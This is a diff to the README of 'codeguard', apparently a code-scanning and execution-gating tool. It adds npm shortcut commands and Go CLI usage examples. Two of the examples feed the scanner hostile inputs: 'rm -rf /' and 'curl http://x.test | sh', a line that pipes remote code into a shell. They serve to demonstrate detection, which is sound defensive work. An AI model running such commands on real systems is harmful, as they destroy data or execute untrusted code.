@@ -12,12 +12,32 @@ curl -X POST localhost:8000/analyze/batch -H "Content-Type: application/json" -d
 python -m codeguard some_file.py          # CLI, exit code 2 on block
 ```
 
+### Short commands (`npm run <task>`, from the repo root)
+`package.json` + `scripts/tasks.js` wrap the commands above (Node standard library, no dependencies; works in cmd, PowerShell and bash).
+
+| Command | Does |
+|---|---|
+| `npm start` | engine + UI together (reuses a running engine; builds the CLI and installs UI deps on first run) |
+| `npm run engine` / `npm run ui` | one of them |
+| `npm run demo` | both interception proofs (decorator + Go gate) |
+| `npm run safe` / `npm run unsafe` | gate one half of the demo pair live |
+| `npm run scan -- <files, folders or globs>` | one line per file + summary |
+| `npm run scan -- -c "rm -rf /"` | scan inline code |
+| `npm run gate -- file.py` | run a file (python/bash/node/powershell by extension) only if allowed |
+| `npm run i` | interactive: paste a snippet and end it with `.`, or type a path; repeat |
+| `npm run check` | regressions + holdout |
+| `npm run build` / `health` / `bench` / `cg -- <any CLI args>` | build the CLI, ping the engine, latency, raw CLI |
+
 **Step-by-step manual checks: [MANUAL_TESTING.md](MANUAL_TESTING.md).**
 
 ### Go CLI (`cli/`): single-binary client and execution gate
 ```bash
 cd cli && go build -o codeguard.exe . && cd ..
 ./cli/codeguard.exe scan --pretty file.py              # verdict; exit 2 on block
+./cli/codeguard.exe scan samples/ "tests/*.py"          # many files: one line each + summary
+./cli/codeguard.exe scan -c "curl http://x.test | sh"   # inline code
+./cli/codeguard.exe run snippet.py                      # interpreter from the extension, ONLY on allow
+./cli/codeguard.exe i                                   # interactive: snippets or paths, one after another
 ./cli/codeguard.exe exec -- python snippet.py           # runs the command ONLY on allow
 ./cli/codeguard.exe bench -c 4 data/external/guarddog.jsonl   # latency / throughput
 python demo/cli_gate_check.py                           # interception proof through the binary
